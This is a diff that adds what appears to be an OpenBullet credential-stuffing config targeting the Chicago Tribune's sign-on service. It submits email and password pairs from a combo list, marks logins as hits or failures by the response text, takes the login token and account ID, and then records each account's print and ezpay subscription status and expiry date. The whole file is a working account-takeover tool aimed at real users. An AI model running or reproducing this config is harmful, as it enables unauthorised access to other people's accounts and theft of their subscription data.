@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "chicago",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-12T22:01:01.2027112-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://tribune.signon.trb.com/registration/trbsecurity/authconsumer/cors" 
+  CONTENT "product_code=chiarc&master_id=&stateless=true&email=<USER>&password=<PASS>&get_login_token=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Please supply email and password" 
+    KEY "Please enter a valid password" 
+    KEY "Please enter a valid email address" 
+    KEY "Please click the Facebook button to sign in" 
+  KEYCHAIN Success OR 
+    KEY "authed\":true" 
+
+PARSE "<SOURCE>" LR "loginToken\":\"" "\"" -> VAR "login" 
+
+REQUEST GET "https://tribune.signon.trb.com/registration/trbsecurity/userprofile?callback=jQuery33105406155500953966_1589333943991&product_code=chiarc&master_id=&stateless=true&signon_token=<login>&_=1589333943993" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "masterId\":\"" "\"" -> VAR "ID" 
+
+REQUEST GET "https://www.tribdss.com/subscriptions/user/ctc?callback=jQuery33105406155500953966_1589333943991&product_code=chiarc&master_id=<ID>&stateless=true&signon_token=<login>&ssor_id=<ID>&_=1589333943996" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "printSubscriber\":false,\"ezpaySubscriber\":false" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "printSubscriber\":false,\"ezpaySubscriber\":false" 
+
+PARSE "<SOURCE>" LR "printSubscriber\":" "," CreateEmpty=FALSE -> CAP "PRINT" 
+
+PARSE "<SOURCE>" LR "ezpaySubscriber\":" "," CreateEmpty=FALSE -> CAP "EZPAY" 
+
+PARSE "<SOURCE>" LR "expirationDate\":" "}" -> VAR "exp" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd" "<exp>" -> CAP "EXP" 
+
